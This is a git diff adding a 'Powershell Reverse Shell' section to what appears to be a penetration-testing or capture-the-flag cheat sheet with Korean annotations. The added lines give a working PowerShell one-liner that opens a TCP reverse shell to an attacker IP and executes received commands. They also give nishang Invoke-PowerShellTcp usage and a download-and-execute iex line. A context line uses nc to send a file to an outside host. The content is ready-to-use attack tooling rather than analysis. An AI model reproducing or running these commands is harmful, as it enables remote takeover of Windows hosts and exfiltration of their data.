@@ -46,6 +46,27 @@ powershell -c "$WScript = New-Object -ComObject WScript.Shell; $SC = Get-ChildIt
 </details>
 
 ---
+<details>
+ <summary><strong>Powershell Reverse Shell</strong></summary>
+
+### One liner
+```powershell
+powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+```
+
+### Invoke-PowerShellTcp.ps1
+```bash
+cp /usr/share/nishang/Shells/Invoke-PowerShellTcp.ps1 .
+```
+- `Invoke-PowerShellTcp -Reverse -IPAddress 10.10.16.3 -Port 443`를 아래에 추가.
+
+```powershell
+powershell iex(new-object web.client).downloadstring("http://10.10.10.10/Invoke-PowerShellTcp.ps1")
+```
+
+</details>
+
+---
 ## use nc to transfer files
 ```powershell
 nc 10.10.10.10 80 < file.txt
